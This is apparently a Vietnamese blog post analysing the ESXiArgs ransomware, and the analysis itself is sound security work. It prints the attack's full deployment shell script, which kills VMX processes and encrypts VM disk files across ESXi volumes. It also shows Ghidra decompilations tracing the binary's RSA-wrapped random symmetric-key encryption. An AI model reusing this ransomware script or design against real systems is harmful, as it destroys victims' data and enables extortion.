---
title: "Phân tích mã độc ESXiArgs"
date: 2024-04-01T14:42:54+07:00
tags:
  - mã độc
  - dịch ngược
  - bảo mật
author: "Name Nguyễn"
description: "Học cách hoạt động của ransomware ESXiArgs bằng cách dịch ngược nó"
---

Năm vừa qua có xảy ra 1 vụ tấn công ransomware gọi là **ESXiArgs**. Vũ tấn công này đã làm mã hóa hàng trăm các máy ảo VMware khác nhau. Và mình quyết định là sẽ thử sức dịch ngược và phân tích mã độc này để xem nó hoạt động thế nào.

> Note: Mẫu mã độc này được lấy từ [forum bleepingcomputer](https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14#entry5470686)

# Script chạy

Mình sẽ bắt đầu bằng phân tích script chạy mã đọc trước:

```bash
## CHANGE CONFIG

for config_file in $(esxcli vm process list | grep "Config File" | awk '{print $3}'); do
  echo "FIND CONFIG: $config_file"
  sed -i -e 's/.vmdk/1.vmdk/g' -e 's/.vswp/1.vswp/g' "$config_file"
done
```

Đoạn code này sẽ tìm các file config và đổi các file `vmdk` sang file `vswp`. Ở đây cũng ko có gì quá thú vị về mặt phân tích.

Trong đoạn tiếp theo, script này sẽ dừng quá trình tên là `VMX`:

```bash
## STOP VMX
echo "KILL VMX"
kill -9 $(ps | grep vmx | awk '{print $2}')
```

Quá trình `VMX` là quá trình quản lý các thiết bị I/O (Input/Output). Nó cũng hỗ trợ việc giao tiếp giữa interface người dùng, quản lý snapshot của máy ảo và console remote

Đoạn tiếp theo của script là đoạn *mã hóa*:

```bash
## ENCRYPT

chmod +x $CLEAN_DIR/encrypt

for volume in $(IFS='\n' esxcli storage filesystem list | grep "/vmfs/volumes/" | awk -F'  ' '{print $2}'); do
  echo "START VOLUME: $volume"
  IFS=$'\n'
  for file_e in $( find "/vmfs/volumes/$volume/" -type f -name "*.vmdk" -o -name "*.vmx" -o -name "*.vmxf" -o -name "*.vmsd" -o -name "*.vmsn" -o -name "*.vswp" -o -name "*.vmss" -o -name "*.nvram" -o -name "*.vmem"); do
      if [[ -f "$file_e" ]]; then
        size_kb=$(du -k $file_e | awk '{print $1}')
        if [[ $size_kb -eq 0 ]]; then
          size_kb=1
        fi
        size_step=0
        if [[ $(($size_kb/1024)) -gt 128 ]]; then
          size_step=$((($size_kb/1024/100)-1))
        fi
        echo "START ENCRYPT: $file_e SIZE: $size_kb STEP SIZE: $size_step" "\"$file_e\" $size_step 1 $((size_kb*1024))"
        echo $size_step 1 $((size_kb*1024)) > "$file_e.args"
        nohup $CLEAN_DIR/encrypt $CLEAN_DIR/public.pem "$file_e" $size_step 1 $((size_kb*1024)) >/dev/null 2>&1&
      fi
  done
  IFS=$" "
done
```

Phân tích đoạn này nào: 

```bash
for volume in $(IFS='\n' esxcli storage filesystem list | grep "/vmfs/volumes/" | awk -F'  ' '{print $2}'); do
```

Vòng lặp đầu tiên sẽ đi qua các cái volume trong folder `/vmfs/volumes/`.

```bash
for file_e in $( find "/vmfs/volumes/$volume/" -type f -name "*.vmdk" -o -name "*.vmx" -o -name "*.vmxf" -o -name "*.vmsd" -o -name "*.vmsn" -o -name "*.vswp" -o -name "*.vmss" -o -name "*.nvram" -o -name "*.vmem"); do
```

Vòng lặp thứ 2 sẽ tìm các file trong các volume đó với các đuôi sau:
- `.vmdk`
- `.vmx`
- `.vmxf`
- `.vmsd`
- `.vmsn`
- `.vswp`
- `.vmss`
- `.nvram`
- `.vmem`

```bash
if [[ -f "$file_e" ]]; then
    size_kb=$(du -k $file_e | awk '{print $1}')
    if [[ $size_kb -eq 0 ]]; then
        size_kb=1
    fi
    size_step=0
    if [[ $(($size_kb/1024)) -gt 128 ]]; then
        size_step=$((($size_kb/1024/100)-1))
    fi
```

Đoạn này của script sẽ tính kích cỡ của các file tìm được trong vòng lặp thứ 2. Số bước để mã hóa file (số MB để skip) sẽ được suy ra từ kích cỡ của file.

```bash
nohup $CLEAN_DIR/encrypt $CLEAN_DIR/public.pem "$file_e" $size_step 1 $((size_kb*1024)) >/dev/null 2>&1&
```

Đường dẫn file, kích cỡ file và số bước mã hóa sẽ được truyền vào trong file nhị phân `encrypt`. File này cũng lấy 1 cái khóa công khai. Output của câu lệnh này sẽ được truyền vào `/dev/null` để không output ra console.

Script này cũng dùng `nohup` để thực thi file nhị phân này trong background. Nó làm vậy để có thể mã hóa nhiều file cùng 1 lúc.

Sau khi mình nghiên cứu về con mã độc này, mình biết là tác giả con mã độc này sẽ dùng 2 file nhị phân là `encrypt` và `decrypt`. File `decrypt` sẽ cần 1 *khóa bí mật*. Khóa này sẽ được giữ bởi tác giả mã độc và nạn nhân của con mã độc này sẽ cần trả tiền cho tác giả để lấy được khóa bí mật đó.

Mình sẽ phân tích file `encrypt` bởi vì nó là lõi của mã độc này.

# Phân tích file nhị phân encrypt

Đầu tiên thì mình sử dụng câu lệnh `file` để xem file có những gì:

```bash
$ file encrypt
encrypt: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.8, with debug_info, not stripped
```

Mình thấy là nó là file `ELF 64-bit`  bởi vì mã độc này chạy trên các bộ xử lý x64. `dynamically linked` có nghĩa là mã độc này được biên dịch với `GCC` bình thường, không sử dụng cờ biên dịch gì phức tạp. 

Nó cũng được biên dịch cho `GNU/Linux 2.6.8`. Đây là 1 phiên bản Linux khá là cũ.

Có 1 điều lạ ở đây là file nhị phân này có `debug_info, not stripped`. Thường thì các tác giả mã độc sẽ "lột" các thông tin debug từ 1 cái file nhị phân bởi vì họ không muốn mã độc của họ bị phân tích và dịch ngược. Nhưng mà mã độc ESXiArgs này lại vẫn còn các thông tin debug. Tức là các hàm trong file này vẫn còn các thông tin và file này cũng còn giữ thông tin từ `GCC` về quá trình biên dịch của nó.

Tiếp theo thì mình chạy thử câu lệnh `strings` để xem bên trong file nhị phân này có những gì:

```bash
$ strings encrypt
```

Bởi vì file không bị làm rối và bị "lột", mình đi tìm thông tin liên quan đến mã hóa và mình tìm được cái này:

```bash
BIO_new_mem_buf
ERR_get_error
ERR_error_string
PEM_read_bio_RSA_PUBKEY
PEM_read_bio_RSAPrivateKey
RAND_pseudo_bytes
RSA_public_encrypt
RSA_private_decrypt
RSA_size
```

`PEM_read_bio_RSA_PUBKEY` sẽ đọc file khóa công khai. `PEM_read_bio_RSAPrivateKey` sẽ đọc file khóa bí mật. `RAND_pseudo_bytes` sẽ tạo ra byte random, byte này chắc sẽ được sử dụng cho việc mã hóa. 

Mình cũng tìm được `RSA_public_encrypt` và `RSA_private_decrypt`. Thế file nhị phân này chắc sẽ sử dụng thuật toán mã hóa bất đối xứng **RSA**.

*Mã hóa bất đối xứng* nó như là 1 hòm thư. Hòm thư là 1 vật công cộng, ai cũng có thể đút thư vào nó. Nhưng chỉ có chủ của hòm thư đó mới có chìa khóa để mở hòm thư đó và đọc thư trong đó.

*Mã hóa bất đối xứng* cũng giống như vậy. Nó sử dụng 2 khóa, *khóa công khai* và *khóa bí mật*. Khóa công khai sẽ được phân phát cho các máy khác. Khi mà 1 người nào đó muốn gửi dữ liệu cho mình thì họ sẽ sử dụng khóa công khai của mình để mã hóa dữ liệu và mình sẽ sử dụng khóa bí mật của mình để giải mã dữ liệu đã được mã hóa. Phương thức này rất an toàn bởi vì nếu như hacker lấy được cả dữ liệu và khóa công khai thì họ cũng không thể làm gì được bởi vì khóa công khai không thể giải mã được, nó chỉ mã hóa được. Một khi dữ liệu được mã hóa với khóa công khai thì nó chỉ có thể được giải mã bằng khóa bí mật.

File nhị phân này sẽ sử dụng `RSA_public_encrypt` với 1 khóa công khai để mã hóa các file và `RSA_private_decrypt` với 1 khóa bí mật để giải mã các file. 

Để tìm hiểu sâu hơn về mã độc này, mình sẽ sử dụng 1 chương trình phân dịch để dịch ngược file này.

# Phân dịch file nhị phân

Mình sẽ sử dụng chương trình phân dịch [[**Ghidra**]](https://ghidra-sre.org/) bởi vì mình đang học cách dùng nó.

{{< image src="/img/ghidra-esxiargs.png" alt="ESXiArgs trong Ghidra" position="center" style="padding: 10px" >}}

Đây là hàm `main` trong file nhị phân `encrypt` này:
```c
undefined4 main(int param_1,long param_2)

{
  int iVar1;
  undefined4 local_4c;
  long local_38;
  long local_30;
  long local_28;
  undefined8 local_20;
  undefined8 local_18;
  uint local_c;
  
  if (param_1 < 3) {
    puts("usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]");
    puts("       enc_step   -   number of MB to skip while encryption");
    puts("       enc_size   -   number of MB in encryption block");
    puts("       file_size  -   file size in bytes (for sparse files)\n");
    local_4c = 1;
  }
  else {
    local_28 = 0;
    local_30 = 1;
    local_38 = 0;
    if (3 < param_1) {
      iVar1 = atoi(*(char **)(param_2 + 0x18));
      local_28 = (long)iVar1;
    }
    if (4 < param_1) {
      iVar1 = atoi(*(char **)(param_2 + 0x20));
      local_30 = (long)iVar1;
    }
    if (5 < param_1) {
      iVar1 = atoi(*(char **)(param_2 + 0x28));
      local_38 = (long)iVar1;
    }
    local_c = init_libssl();
    if (local_c == 0) {
      iVar1 = get_pk_data(*(undefined8 *)(param_2 + 8),&local_18);
      if (iVar1 == 0) {
        iVar1 = create_rsa_obj(local_18,&local_20);
        if (iVar1 == 0) {
          iVar1 = encrypt_file(*(undefined8 *)(param_2 + 0x10),local_20,local_28,local_30,local_38);
          if (iVar1 == 0) {
            local_4c = 0;
          }
          else {
            print_error("encrypt_file",0);
            local_4c = 5;
          }
        }
        else {
          print_error("create_rsa_obj",0);
          local_4c = 4;
        }
      }
      else {
        print_error("get_pk_data",0);
        local_4c = 3;
      }
    }
    else {
      printf("init_libssl returned %d\n",(ulong)local_c);
      local_4c = 2;
    }
  }
  return local_4c;
}
```

Mình sẽ phân tích từng phần code trong hàm `main` này.

```c
undefined4 main(int param_1,long param_2)
```

Chúng ta thấy được là hàm `main` sẽ lấy 2 tham số. Thường thì trong chương trình C, 2 tham số này sẽ là `argc` và `argv`. `argc` là số các đối số và `argv` là mảng chứa các đối số đó.

Để làm cho việc phân tích file nhị phân này dễ hơn thì khi mà mình đoán được 1 biến được sử dụng để làm gì thì mình sẽ đặt lại tên cho nó. Mình sẽ đặt tên `param_1` thành `argc` và `param_2` thành `argv`

Và bởi vì `param_2` có kiểu dữ liệu là `long`, mình sẽ đổi nó thành `char**` bởi vì đó là kiểu dữ liệu mà `argv` sử dụng.

```c
if (argc < 3) {
  puts("usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]");
  puts("       enc_step   -   number of MB to skip while encryption");
  puts("       enc_size   -   number of MB in encryption block");
  puts("       file_size  -   file size in bytes (for sparse files)\n");
  local_4c = 1;
}
```

Đoạn code này sẽ in ra cách sử dụng file nhị phân này. Từ đây mình thấy là nó sẽ cần file khóa công khai và đường dẫn tới file cần được mã hóa. Mình cũng thấy là file này có thể lấy thêm các đối số khác như là số bước mã hóa, độ lớn file và số MB trong block mã hóa.

```c
if (3 < argc) {
  iVar1 = atoi(argv[3]);
  local_28 = (long)iVar1;
}
if (4 < argc) {
  iVar1 = atoi(argv[4]);
  local_30 = (long)iVar1;
}
if (5 < argc) {
  iVar1 = atoi(argv[5]);
  local_38 = (long)iVar1;
}
```

Đoạn code này sẽ check xem file nhị phân có thêm đối số, nếu có thì nó sẽ xử lý các đối số thêm đó. Các đối số thêm đó đã được nhắc đến trong tin nhắn sử dụng trên.

```c
local_c = init_libssl();
```

Ở đây thì chương trình sẽ gọi hàm `init_libssl()`. Hàm này nghe khá thú vị nên mình sẽ check xem hàm này sẽ làm những gì.

```c
plibssl = dlopen("libssl.so",2);
```

Trong hàm này sẽ sử dụng hàm `dlopen()`. Hàm này sử dụng trình liên kết để mở file `libssl.so`. Trình liên kết sẽ liên kết các file đã được biên dịch với chương trình hiện tại. Thế là hàm này đang cố liên kết file `libssl.so` với file nhị phân này.

```c
if (plibssl == 0) {
  for (local_3c = 0; (int)local_3c < 0x10; local_3c = local_3c + 1) {
    sprintf(local_38,"libssl.so.%d",(ulong)local_3c);
    plibssl = dlopen(local_38,2);
    if (plibssl != 0) break;
  }
  if (plibssl == 0) {
    local_4c = 1;
    goto LAB_00400de1;
  }
}
```

Tiếp theo thì nếu như `plibssl == 0` (nếu như hàm `dlopen()` fail, không mở được file `libssl.so`) thì nó sẽ cố tìm 1 phiên bản nào đó của `libssl.so` bằng cách dùng kí tự wildcard `"libssl.so.%d"`.

```c
lBIO_new_mem_buf = dlsym(plibssl,"BIO_new_mem_buf");
```

Sau khi nó tìm được 1 file `libssl.so`, nó sẽ sử dụng `dlsym()` để load symbol `BIO_new_mem_buf` từ libssl trong khi chạy.

```c
lERR_error_string = dlsym(plibssl,"ERR_error_string");
if (lERR_error_string == 0) {
  local_4c = 4;
}
else {
  lPEM_read_bio_RSA_PUBKEY = dlsym(plibssl,"PEM_read_bio_RSA_PUBKEY");
  if (lPEM_read_bio_RSA_PUBKEY == 0) {
      local_4c = 5;
  }
  else {
    lPEM_read_bio_RSAPrivateKey = dlsym(plibssl,"PEM_read_bio_RSAPrivateKey");
    if (lPEM_read_bio_RSAPrivateKey == 0) {
      local_4c = 6;
    }
    else {
      lRAND_pseudo_bytes = dlsym(plibssl,"RAND_pseudo_bytes");
      if (lRAND_pseudo_bytes == 0) {
        local_4c = 7;
      }
      else {
        lRSA_public_encrypt = dlsym(plibssl,"RSA_public_encrypt");
        if (lRSA_public_encrypt == 0) {
          local_4c = 8;
        }
        else {
          lRSA_private_decrypt = dlsym(plibssl,"RSA_private_decrypt");
          if (lRSA_private_decrypt == 0) {
            local_4c = 9;
          }
          else {
            lRSA_size = dlsym(plibssl,"RSA_size");
            if (lRSA_size == 0) {
              local_4c = 10;
            }
            else {
              local_4c = 0;
            }
          }
        }
      }
    }
  }
}
```

Các đoạn code này cũng sẽ làm việc giống như đoạn trước. Tức là hàm này sẽ lấy các hàm khác nhau bằng cách sử dụng linker để sau này nó có thể sử dụng các hàm đó. Nhìn vào đoạn code này thì mình có thể đoán được chương tình này sẽ làm những gì.

Nó lấy `PEM_read_bio_RSA_PUBKEY` để đọc khóa công khai RSA, nó lấy `PEM_read_bio_RSAPrivateKey` để đọc khóa bí mật RSA, nó lấy `RAND_pseudo_bytes` để tạo byte random, các byte này chắc sẽ được sử dụng cho việc mã hóa các file, vân vân. Từ mấy hàm này thì mình có thể đoán là nó đang load các hàm liên quan đến thuật toán mã hóa **RSA** để nó có thể sử dụng cho việc mã hóa.

Đó là hàm `init_libssl()`, nó sẽ load các hàm từ `libssl` để sau này chương trình này có thể sử dụng. Mình sẽ quay lại hàm `main` và tiếp tục phân tích code trong hàm đó.

```c
iVar1 = get_pk_data(argv[1],&local_18);
```

Tiếp theo, chương trình này sẽ gọi hàm nữa gọi là `get_pk_data()`. Mình đoán là `pk` là viết tắt cho *public key*, nghĩa là khóa công khai, bởi vì chương trình này đang cần mã hóa file và khóa công khai sẽ được sử dụng cho việc mã hóa file trong mã hóa bất đối xứng.

Nhưng để có thể chắc chắn thì mình sẽ mở hàm đó lên và xem nó làm những gì.

```c
__fd = open_read(param_1);
if (__fd == -1) {
  print_error("open_pk_file",0);
  local_3c = 1;
}
```

Đoạn này sẽ đọc 1 file `param_1`, File này sẽ là `argv[1]` và nó sẽ là file khóa công khai.

```c
__nbytes = lseek(__fd,0,2);
if (__nbytes == 0xffffffffffffffff) {
  print_error("lseek [end]",1);
  local_3c = 2;
}
else if (__nbytes == 0) {
  puts("get_pk_data: key file is empty!");
  local_3c = 3;
}
```

Đoạn này sẽ dùng `lseek()` để đi đến cuối file và kiểm tra xem file đó có trống hay không.

```c
pvVar1 = calloc(__nbytes + 1,1);
*param_2 = pvVar1;
_Var2 = lseek(__fd,0,0);
if (_Var2 == -1) {
  print_error("lseek [start]",1);
  local_3c = 4;
}
else {
  sVar3 = read(__fd,*param_2,__nbytes);
  if (sVar3 == -1) {
    print_error(&DAT_0040841e,1);
    local_3c = 5;
  }
  else {
    close(__fd);
    local_3c = 0;
  }
}
```

Đoạn này sẽ tạo 1 buffer với kích cỡ `__nbytes + 1` và đọc từ file khóa vừa mở vào buffer này, buffer này sẽ được gán vào `param_2`, rồi nó sẽ đóng file và trả về `main`. 

Nhìn chung thì hàm `get_pk_data()` sẽ đọc file khóa công khai vào tham số thứ 2 của hàm. Thế thì mình sẽ đặt lại tên tham số này trong hàm `main` (hiện tại là `local_18`) thành `public_key_buffer`. Mình sẽ quay lại hàm `main` và tiếp tục phân tích.

```c
iVar1 = create_rsa_obj(public_key_buffer,&local_20);
```

Tiếp theo chương trình sẽ gọi hàm `create_rsa_obj`. Hàm này chắc sẽ lấy `public_key_buffer` mà `get_pk_data()` vừa tạo, tạo 1 đối tượng RSA và gán đối tượng đó vào `local_20`. 

Để kiểm chứng giả thuyết của mình thì mình sẽ phân tích code trong hàm này.

```c
undefined4 create_rsa_obj(undefined8 param_1,undefined8 *param_2)

{
  long lVar1;
  undefined4 local_2c;
  
  lVar1 = (*lBIO_new_mem_buf)(param_1,0xffffffff);
  if (lVar1 == 0) {
    print_error_ex("BIO_new_mem_buf",1);
    local_2c = 1;
  }
  else {
    *param_2 = 0;
    lVar1 = (*lPEM_read_bio_RSA_PUBKEY)(lVar1,param_2,0,0);
    if (lVar1 == 0) {
      print_error_ex("PEM_read_bio_RSA_PUBKEY",1);
      local_2c = 2;
    }
    else {
      local_2c = 0;
    }
  }
  return local_2c;
}
```

Bởi vì đoạn code này cũng khá ngắn và dễ hiểu nên mình sẽ đi qua đoạn code này nhanh. Mình thấy là nó gọi hàm *Basic I/O memory buffer* (hàm này sẽ tạo 1 cái buffer trong bộ nhớ) để tạo 1 buffer trong bộ nhớ để tạm thời chứa đối tượng RSA, nó sẽ tạo 1 đối tượng RSA từ `public_key_buffer` và nó gán cái đối tượng vào `param_2`, mà `param_2` trong trường hợp này sẽ là `local_20` ở trong hàm `main`.

Mình sẽ đặt tên lại cho `local_20` thành `rsa_key_object`.

```c
iVar1 = encrypt_file(argv[2],rsa_key_object,local_28,local_30,local_38);
```

Tiếp theo trong hàm `main` là 1 hàm khá thú vị. Đây là hàm mã hóa. Mình có thể thấy là 1 trong những tham số của hàm này là `argv[2]`, đây là đường dẫn tới file. Hàm này cũng sẽ có 1 tham số nữa là `rsa_key_object`.

Mình sẽ phân tích code của hàm này và xem chương trình này mã hóa file như thế nào.

```c
local_10 = *(long *)(in_FS_OFFSET + 0x28);
local_3c = open_read_write(file_to_encrypt);
if (local_3c == -1) {
  print_error("open_read",1);
  local_74 = 1;
}
```

Mình có thể thấy ở đoạn này thì nó sẽ mở file để đọc và viết. Nó đang đọc file vào biến `local_3c` thế nên mình sẽ đặt lại tên của biến này là `encrypt_file_buffer`.


```c
iVar1 = gen_stream_key(local_38,0x20);
```

Ở đoạn này thì nó sẽ gọi hàm `get_stream_key()`. Mình đoán là hàm này sẽ tạo ra 1 khóa đối xứng. Mình thấy là nó có tham số là `0x20`, và bất cứ bội số của 16 hay 128 bit sẽ là 1 khóa stream đối xứng. Thế mình nghĩ là khóa đối xứng sẽ được sử dụng mã hóa đối xứng.

Biến `local_38` là 1 tham số của hàm này, thế nên mình đoán là nó sẽ là buffer cho khóa đối xứng. Mình sẽ đặt lại tên biến này thành `sym_key_buffer`.

Mình sẽ xem hàm `gen_stream_key()` có những gì:

```c
bool gen_stream_key(undefined8 param_1,undefined4 param_2)

{
  int iVar1;
  
  iVar1 = (*lRAND_pseudo_bytes)(param_1,param_2);
  if (iVar1 == 0) {
    print_error_ex("RAND_pseudo_bytes",1);
  }
  return iVar1 == 0;
}
```

Nhìn tổng thể thì hàm này sẽ tạo ra 1 khóa đối xứng giả ngẫu nhiên. Tức là khóa đối xứng này là an toàn. Nếu như tác giả mã độc này dùng 1 cái seed tạo số random chọn trước hay 1 giá trị không random là khóa thì khóa này sẽ không an toàn và có thể bị phá. 

Mình sẽ tiếp tục phân tích ở trong hàm `encrypt_file()`:

```c
iVar1 = rsa_encrypt(param_2,sym_key_buffer,0x20,&local_48,&local_40);
```

Ở đoạn này thì nó sẽ gọi hàm `rsa_encrypt()`. Mình sẽ vào phân tích code của hàm này.

```c
undefined4 rsa_encrypt(undefined8 param_1,undefined8 param_2,int param_3,void **param_4,int *param_5)

{
  int iVar1;
  void *pvVar2;
  undefined4 local_44;
  
  iVar1 = (*lRSA_size)(param_1);
  if (param_3 < iVar1) {
    iVar1 = (*lRSA_size)(param_1);
    pvVar2 = calloc((long)iVar1,1);
    *param_4 = pvVar2;
    iVar1 = (*lRSA_public_encrypt)(param_3,param_2,*param_4,param_1,1);
    if (iVar1 == -1) {
      print_error_ex("RSA_public_encrypt",1);
      local_44 = 2;
    }
    else {
      *param_5 = iVar1;
      local_44 = 0;
    }
  }
  else {
    puts("encrypt_bytes: too big data");
    local_44 = 1;
  }
  return local_44;
}

```

Nhìn qua thì mình có thể thấy là hàm này đang mã hóa khóa đối xứng sử dụng đối tượng RSA mà nó tạo ra từ trước. Mình có thể thấy là ở dòng `iVar1 = (*lRSA_public_encrypt)(param_3,param_2,*param_4,param_1,1);` thì `param_3` là `0x20` và `param_2` là `sym_key_buffer`.

```c
iVar1 = encrypt_simple(encrypt_file_buffer,param_3,param_4,sym_key_buffer,0x20,param_5);
```

Tiếp theo thì chương trình này sẽ gọi `encrypt_simple()`. Mình đoán là nó sẽ sử dụng `sym_key_buffer` để mã hóa `encrypt_file_buffer`. Nó sẽ lấy khóa đối xứng và dùng nó để mã hóa file.

Nhìn trong hàm `encrypt_simple()` thì mình thấy là nó là hàm tính toán mã hóa. Thế nên giả định trước của mình là đúng.

Code còn lại sau đoạn này chỉ là xử lý lỗi và viết file đã mã hóa vào file cũ.

Nếu như mình muốn giải mã các file bị mã hóa thì mình cần sử dụng khóa bí mật. Mình sẽ cần lấy khóa đối xứng từ khóa bí mật và dùng khóa đối xứng đó để giải mã các file.

# Kết luận

Đó là quá trình phân tích mã độc ESXiArgs của mình. Mình đã cố gắng đi qua các chi tiết quan trọng trong con mã độc này.

Điều mình thấy lạ về con mã độc này các thông tin debug vẫn còn trong file nhị phân này. Sau khi phân tích mã độc này thì mình thấy là nếu như mình là nạn nhân của con mã độc này thì mình cũng không thể làm gì để lấy lại file. Con mã độc này bắt buộc nạn nhân phải trả tiền bởi vì nó sử dụng mã hóa bất đối xứng cộng với khóa đối xứng random

Kể cả sau khi phân tích con mã độc này, mình cũng không có thông tin gì mà có thể giúp nạn nhân lấy lại file. 1 giả thuyết khá điên của mình là tác giả mã độc để các thông tin debug lại trong file nhị phân để "flex", bởi vì họ biết là mã độc của họ, một khi đã mã hóa 1 file thì sẽ phải cần khóa bí mật để giải mã. Và họ là người duy nhất có khóa bí mật đó.
